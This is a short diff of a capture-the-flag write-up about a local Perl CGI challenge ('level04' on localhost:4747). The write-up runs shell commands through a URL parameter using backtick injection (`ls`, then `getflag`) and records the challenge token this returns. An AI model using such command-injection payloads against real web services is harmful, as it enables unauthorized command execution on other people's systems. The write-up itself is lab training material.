@@ -17,10 +17,10 @@ when we cat it we got :
 	x(param("x")); 							# get the param of x from the url
 
 if we place a x with a ls inside we get the same file, so we can execute command at this port 
-	curl 'localhost:4747/level04.pl?x=`ls`'
+	curl 'localhost:4747?x=`ls`'
 
 do this give us the flag 
-	curl 'localhost:4747/level04.pl?x=`getflag`'
+	curl 'localhost:4747?x=`getflag`'
 
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 
